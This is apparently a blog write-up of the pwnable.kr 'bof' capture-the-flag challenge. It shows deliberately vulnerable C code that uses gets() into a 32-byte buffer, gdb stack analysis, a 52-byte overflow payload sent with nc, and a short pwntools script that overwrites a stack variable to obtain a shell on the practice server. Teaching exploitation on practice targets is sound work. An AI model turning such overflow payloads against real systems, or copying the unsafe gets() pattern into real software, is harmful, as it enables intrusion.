### Introduction 
#### Hey guys it's been a long time since my [first pwn write-up](https://0xrick.github.io/pwn/fd/),  today I'll write about another challenge from [pwnable.kr](https://pwnable.kr) called bof. It was a simple easy buffer overflow challenge (You can also check [these](/categories/#binary-exploitation)), by overwriting a variable we can get a shell. I'll also write a small exploit with `pwntools` that spawns a shell automatically.

### Challenge Description 
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```
#### Pretty straightforward, we have the vulnerable binary, its source code and the port where it's running.

### Code Analysis 
#### Let's take a look at the code :
![](/images/pwn/bof/2.png)
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
#### There are two functions, the main function and another function called `func()`
#### `func()`:
```
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
```
#### Breakdown :
#### The function takes a variable called `key`, it starts by creating a variable called `overflowme` and sets a buffer of 32 chars for it : `char overflowme[32];`
#### Then it prints `overflow me :` (`printf("overflow me : ");`)  and waits for our input which will be saved in the variable `overflowme` (`gets(overflowme);`)
#### After that there's an if statement that checks if the variable `key` is equal to `0xcafebabe` (`if(key == 0xcafebabe){`). If that's true it will spawn a shell (`system("/bin/sh");`), if `key` is equal to anything else it will print `Nah..` (`printf("Nah..\n");`)
<br>
#### `main()` :
```
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
```
#### Basically what the main function is doing is just calling the function `func()` giving `key` the value of `0xdeadbeef`
<br>
#### So we need to make `key` equal to `0xcafebabe` instead of `0xdeadbeef` to make it spawn a shell. We control `overflowme` but we don't control `key`. If we can cause a buffer overflow we will be able to overwrite `key`, and obviously `overflowme` is vulnerable.

### Examining the Binary, Exploitation
#### I ran the program and tested it a couple of times. First one with a short input :
![](/images/pwn/bof/3.png)
#### Second one with a longer input and it crashed:
![](/images/pwn/bof/4.png)
#### Important thing to note here, we don't want to know the offset or where the program exactly crashes. This is because we don't need to overwrite `EIP`, we need to overwrite a variable's value and that's located on the stack. So giving the program a pattern and finding the offset won't help because we need to know where `0xdeadbeef` is located on the stack.
#### It's time for `gdb`. I started `gdb` and created a break point at `main` (`break main`) then I started the program (`r`) : 
![](/images/pwn/bof/5.png)
#### It stopped at the break point. We need to disassemble the function `func()` to get the address of the compare instruction that compares between the value of `key` and `0xcafebabe` to set another break point there and look at the stack.
`disas func`

#### We can see the [`cmpl` (Compare Logical)](https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm) instruction at `0x0000654`, Lets set a break point exactly before it :
`break *0x80000654`
![](/images/pwn/bof/7.png)
#### Now let's continue the execution (`c`) and wait for our break point.
![](/images/pwn/bof/8.png)
#### I gave it a short input because we don't need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate `0xdeadbeef`.
#### After hitting the second break point let's look at the stack :
`x/50wx $esp`
![](/images/pwn/bof/9.png)
#### `0xdeadbeef` appears at the first row in front of `0xbffff2e0` and our input starts to appear at the last row in front of `0xbffff2a0`. We can locate the distance between our input and `0xdeadbeef` easily, each hex value represents 4 chars (`0x41414141 == AAAA`) and we have exactly 13 of them before `0xdeadbeef` (`1 + 4 + 4 + 4`). 
![](/images/pwn/bof/10.png)
#### We need to give the program exactly 52 chars then `0xcafebabe` and eventually `0xdeadbeef` will be overwritten. 
#### Let's try it, I used python to print the payload in a file then I piped that file to the `nc` connection :
`python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" > ./payload`
<br>
<br>
`(cat payload && cat) | nc pwnable.kr 9000`

### Writing an Exploit with pwntools
#### One of the cool things about `pwntools` is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code. 
#### First thing we need to do is to import `pwntools` : `from pwn import *`
#### We need to store our payload in a variable : `payload = 'A' * 52 + '\xbe\xba\xfe\xca'`
#### Then we need to initiate the connection and assign a variable for it : `shell = remote('pwnable.kr' ,9000)`
#### After that we will send the payload : `shell.send(payload)`
#### And finally we can interact with our shell : `shell.interactive()`
![](/images/pwn/bof/12.png)
```
#!/usr/bin/python
from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
```
